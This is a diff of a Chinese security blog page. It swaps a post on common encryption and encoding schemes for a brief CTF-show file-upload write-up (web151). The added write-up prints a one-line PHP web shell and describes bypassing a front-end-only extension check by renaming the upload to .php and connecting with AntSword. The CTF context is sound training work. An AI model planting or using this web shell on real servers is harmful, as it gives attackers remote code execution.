@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="基础入门">
-    <meta name="description" content="搭建安全拓展">
+    <meta name="keywords" content="文件上传">
+    <meta name="description" content="CTF-show(web151-web170)">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>渗透：加密算法 | E=MC^2</title>
+    <title>CTF-show-文件上传 | E=MC^2</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -298,12 +298,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">渗透：加密算法</h1>
+                    <h1 class="description center-align post-title">CTF-show-文件上传</h1>
                 </div>
             </div>
         </div>
@@ -419,8 +419,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
-                                <span class="chip bg-color">渗透学习</span>
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                <span class="chip bg-color">文件上传</span>
                             </a>
                         
                     </div>
@@ -431,8 +431,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E6%B8%97%E9%80%8F/" class="post-category">
-                                小迪渗透
+                            <a href="/categories/CTF-show/" class="post-category">
+                                CTF-show
                             </a>
                         
                     </div>
@@ -444,28 +444,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-02-03
+                    2022-04-02
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-08
+                    2022-04-02
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    94
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    1 分
                 </div>
                 
 
@@ -485,95 +485,18 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在渗透测试中，常见的密码等敏感信息会采用加密处理，作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备。</p>
-<h3 id="1、常见加密编码等算法分析"><a href="#1、常见加密编码等算法分析" class="headerlink" title="1、常见加密编码等算法分析"></a>1、常见加密编码等算法分析</h3><p>MD5、SHA、ASC、进制、时间戳、URL、base64、Unescape、AES、DES</p>
-<h4 id="（1）MD5（Hash）"><a href="#（1）MD5（Hash）" class="headerlink" title="（1）MD5（Hash）"></a>（1）MD5（Hash）</h4><p>一般会有32或16位，解密一般是枚举对比。</p>
-<p>由数字（0-9）和字母（a-z）组合</p>
-<h4 id="（2）SHA（Hash）"><a href="#（2）SHA（Hash）" class="headerlink" title="（2）SHA（Hash）"></a>（2）SHA（Hash）</h4><p>有四种：</p>
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202202041715037.png" alt="SHA"  />
+                <h3 id="1、web151"><a href="#1、web151" class="headerlink" title="1、web151"></a>1、web151</h3><p><strong>法一：抓包改后缀</strong></p>
+<p>题目提示是前台校验，发现能上传图片，于是准备好的一句话木马改为png后缀上传再抓包</p>
+<p><code>&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;</code></p>
+<p>将文件后缀修改为php再放包，可以看到文件上传成功</p>
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202204021653018.png" alt="修改为php后缀" style="zoom:80%;" />
 
-<p>每种加密的位数是固定的，后面的数字越大，加密后的字符串越长。</p>
-<p>由数字（0-9）和字母（a-z）组合</p>
-<h4 id="（3）时间戳"><a href="#（3）时间戳" class="headerlink" title="（3）时间戳"></a>（3）时间戳</h4><p>禁止缓存css、js，使浏览器同步更新到服务器端最新的静态内容。</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202202051400386.png" alt="时间戳"></p>
-<h4 id="（4）URL编码"><a href="#（4）URL编码" class="headerlink" title="（4）URL编码"></a>（4）URL编码</h4><p>From：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/coco1s/p/5038412.html">https://www.cnblogs.com/coco1s/p/5038412.html</a></p>
-<p>如果一样东西需要编码，说明这样东西并不适合传输。对于URL来说，是因为URL中有些字符会引起歧义。</p>
-<p>例如，URL参数字符串中使用key=value键值对这样的形式来传参，键值对之间以&amp;符号分隔，如<code>/s?q=abc&amp;ie=utf-8</code>。如果你的value字符串中包含了=或者&amp;，那么势必会造成接收URL的服务器解析错误，因此必须将引起歧义的&amp;和=符号进行转义，也就是对其进行编码。</p>
-<p>又如，URL 的编码格式采用的是ASCII码，而不是Unicode，这也就是说你不能在URL中包含任何非ASCII字符，例如中文。否则如果客户端浏览器和服务端浏览器支持的字符集不同的情况下，中文可能会造成问题。</p>
-<p><strong>格式：%xx</strong>（A-Z、0-9）</p>
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202202051421982.png" alt="URL编码1" style="zoom: 50%;" />
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202204021655028.png" alt="上传路径" style="zoom:80%;" />
 
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202202051422291.png" alt="URL编码2" style="zoom:50%;" />
+<p>上传成功后蚁剑连接即可得到flag</p>
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202204021659582.png" alt="蚁剑" style="zoom: 50%;" />
 
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202202051425335.png" alt=" 1=1"></p>
-<p>在原来的URL后输入“  1=1”后，URL变为“%201=1”即空格被编码为%20</p>
-<h4 id="（5）base64编码"><a href="#（5）base64编码" class="headerlink" title="（5）base64编码"></a>（5）base64编码</h4><p>使用64个可打印字符来表示二进制数据的方法，完成数据在HTTP协议上的传输</p>
-<p>特点：</p>
-<p>明文越长，编码越长。</p>
-<p>A-Z、a-z、0-9、= 、+、/ 的随机组合</p>
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202202051431730.png" alt="base64编码" style="zoom:50%;" />
-
-<h4 id="（6）Unescape"><a href="#（6）Unescape" class="headerlink" title="（6）Unescape"></a>（6）Unescape</h4><p><strong>格式：%uxxxx （数字和小写字母）</strong></p>
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202202051438877.png" alt="奇数个" style="zoom: 67%;" />
-
-<p>明文为奇数个字母时：最后一位编码为%u00xx</p>
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202202051440221.png" alt="偶数个" style="zoom:67%;" />
-
-<p>明文为偶数个字母时：最后一位编码为%u0000</p>
-<h4 id="（7）AES加密（对称加密）"><a href="#（7）AES加密（对称加密）" class="headerlink" title="（7）AES加密（对称加密）"></a>（7）AES加密（对称加密）</h4><p>From：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/131324301">https://zhuanlan.zhihu.com/p/131324301</a></p>
-<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/zhaoyanjun6/article/details/120285594">http://blog.csdn.net/zhaoyanjun6/article/details/120285594</a></p>
-<p>实际上是：分组密码加密</p>
-<p>AES的区块长度固定为128位，密钥长度则可以是128 bit，192 bit 或256位 bit 。换算成字节长度，就是密码必须是 16个字节，24个字节，32个字节。AES密码的长度更长了，破解难度就增大了，更安全。</p>
-<p>将明文简单的按照128bit为一个分块进行切割，把每个分块分别进行AES加密，然后再将得到的密文简单的拼接一下即可。</p>
-<p>注意到AES加密只能加密128bit的分块，那问题就产生了：<strong>如果明文的长度不是128bit的倍数，就会存在一个分块不足128bit，那如何对这个分块进行加密？</strong></p>
-<p>为了解决这个问题，发明了一种叫做<strong>填充</strong>的东西。<strong>OFB和CTR不需要填充！</strong></p>
-<p>AES加密需要：明文 + 密钥+ 偏移量（IV）+密码模式(算法/模式/填充)<br>AES解密需要：密文 + 密钥+ 偏移量（IV）+密码模式(算法/模式/填充)</p>
-<p>AES的算法模式一般为 <code>AES/CBC/PKCS7Padding</code></p>
-<p>加密模式：</p>
-<ul>
-<li>电码本模式(ECB)</li>
-<li>密码分组链接模式(CBC)</li>
-<li>计算器模式(CTR)</li>
-<li>密码反馈模式(CFB)</li>
-<li>输出反馈模式(OFB)</li>
-</ul>
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202202051453552.png" alt="AES加密" style="zoom: 50%;" />
-
-<p>模式： 在除ECB以外的所有加密方式中，都需要用到IV（初始化向量/偏移量）对加密结果进行随机化。</p>
-<p>偏移量：一般是为了增加 AES加密的复杂度，增加数据的安全性。一般在 AES_256中会使用到 偏移量 ，而在 AES_128 加密中不会使用到。（不明白偏移量是什么）</p>
-<p>在 AES加密中，一般用到的字符集是 <code>utf-8</code> 和 <code>gbk</code> 。</p>
-<p><strong>注：</strong></p>
-<ul>
-<li>AES 加密/解密 使用相同的密钥</li>
-<li>若涉及到偏移量，则AES 加密/解密 使用的偏移量要一样</li>
-<li>AES 加密/解密 要使用相同加密数位，如都使用<code>AES_256</code></li>
-<li>AES 加密/解密 使用相同的字符集</li>
-<li>AES 加密/解密 使用相同的加密，填充模式，如都使用<code>AES/CBC/PKCS7Padding</code>模式</li>
-<li>由于不同开发语言(如C 和 Java)及不同开发环境(如 Java 和 Android)的影响，可能相同的加解密算法在实现上出现差异，若你们注意到这个差异，就可能导致加解密出现问题</li>
-</ul>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202202051515674.png" alt="CBC模式"></p>
-<p>实际上虽然最后的加密编码可以选择base64/hex（十六进制）但直接用其解密是不可行的</p>
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202202051517086.png" alt="base64直接解密" style="zoom: 67%;" />
-
-<h4 id="（8）DES加密"><a href="#（8）DES加密" class="headerlink" title="（8）DES加密"></a>（8）DES加密</h4><p>A-Z、a-z、0-9、= 、+、/ 的随机组合</p>
-<p>并且可以组合密钥加密</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202202061418349.png" alt="DES加密"></p>
-<h3 id="2、常见加密形式算法解析"><a href="#2、常见加密形式算法解析" class="headerlink" title="2、常见加密形式算法解析"></a>2、常见加密形式算法解析</h3><p>直接加密，带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合</p>
-<h4 id="salt："><a href="#salt：" class="headerlink" title="salt："></a>salt：</h4><p>From：<a target="_blank" rel="noopener" href="https://blog.csdn.net/JBlock/article/details/78446604">https://blog.csdn.net/JBlock/article/details/78446604</a></p>
-<p>Salt 可以是任意字母、数字、或是字母或数字的组合，但必须是随机产生的，每个用户的 Salt 都不一样。</p>
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202202061420693.png" alt="注册时" style="zoom: 50%;" />
-
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202202061421750.png" alt="登录时" style="zoom:50%;" />
-
-<h3 id="3、常见解密方式（针对）"><a href="#3、常见解密方式（针对）" class="headerlink" title="3、常见解密方式（针对）"></a>3、常见解密方式（针对）</h3><p>枚举，自定义逆向算法，可逆向</p>
-<h3 id="4、了解常规加密算法的特性"><a href="#4、了解常规加密算法的特性" class="headerlink" title="4、了解常规加密算法的特性"></a>4、了解常规加密算法的特性</h3><p>长度位数，字符规律，代码分析，搜索获取等</p>
-<h3 id="5、CMS加密解密"><a href="#5、CMS加密解密" class="headerlink" title="5、CMS加密解密"></a>5、CMS加密解密</h3><p>MD5+salt</p>
-<p>eg：</p>
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202202082037775.png" alt="discuz" style="zoom: 50%;" />
-
-<p>md5(md5($pass).$salt);Vbulletin:IceBB dz</p>
-<h3 id="6、某URL加密地址的漏洞测试"><a href="#6、某URL加密地址的漏洞测试" class="headerlink" title="6、某URL加密地址的漏洞测试"></a>6、某URL加密地址的漏洞测试</h3><p>AES+Base64+自定义 </p>
-<p>观察参数值加密字符串，下载源代码分析，函数定义 AES 加密，涉及模式 CBC,128 位，加密密码，偏移量，两次 base64 减去常规一次，填充模式。</p>
+<p><strong>法二：禁js</strong></p>
 
                 
             </div>
@@ -600,7 +523,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/02/03/%E6%B8%97%E9%80%8F%EF%BC%9A%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">http://example.com/2022/02/03/%E6%B8%97%E9%80%8F%EF%BC%9A%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</a>
+                    <a href="http://example.com/2022/04/02/CTF-show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">http://example.com/2022/04/02/CTF-show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -638,8 +561,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
-                                    <span class="chip bg-color">渗透学习</span>
+                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                    <span class="chip bg-color">文件上传</span>
                                 </a>
                             
                         </div>
@@ -685,46 +608,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/02/08/%E6%B8%97%E9%80%8F%EF%BC%9ACDN%E7%BB%95%E8%BF%87/">
+                <a href="/2022/04/02/CTF-show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="渗透：CDN绕过">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="CTF-show-文件上传">
                         
-                        <span class="card-title">渗透：CDN绕过</span>
+                        <span class="card-title">CTF-show-文件上传</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            CDN绕过
+                            CTF-show(web151-web170)
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E6%B8%97%E9%80%8F/" class="post-category">
-                                    小迪渗透
+                            <a href="/categories/CTF-show/" class="post-category">
+                                    CTF-show
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">渗透学习</span>
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                        <span class="chip bg-color">文件上传</span>
                     </a>
                     
                 </div>
@@ -738,24 +663,24 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/28/%E6%B8%97%E9%80%8F%EF%BC%9A%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/">
+                <a href="/2022/03/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="渗透：系统及数据库等">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="文件上传（2）">
                         
-                        <span class="card-title">渗透：系统及数据库等</span>
+                        <span class="card-title">文件上传（2）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            系统及数据库等
+                            文件上传基础
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-28
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-30
                             </span>
                         <span class="publish-author">
                             
@@ -772,8 +697,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">渗透学习</span>
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                        <span class="chip bg-color">文件上传</span>
                     </a>
                     
                 </div>
